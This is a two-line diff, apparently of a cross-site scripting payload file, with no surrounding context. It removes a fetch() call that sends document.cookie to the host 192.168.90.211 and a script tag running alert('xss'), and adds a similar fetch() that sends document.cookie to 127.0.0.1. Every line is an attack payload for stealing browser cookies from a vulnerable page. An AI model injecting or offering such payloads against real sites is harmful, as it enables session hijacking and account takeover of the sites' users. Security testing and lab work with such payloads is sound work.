@@ -1,2 +1,1 @@
-fetch('https://192.168.90.211?c=' + document.cookie)
-<script>alert('xss')</script>
+fetch('https://127.0.0.1:80?c=' + document.cookie)
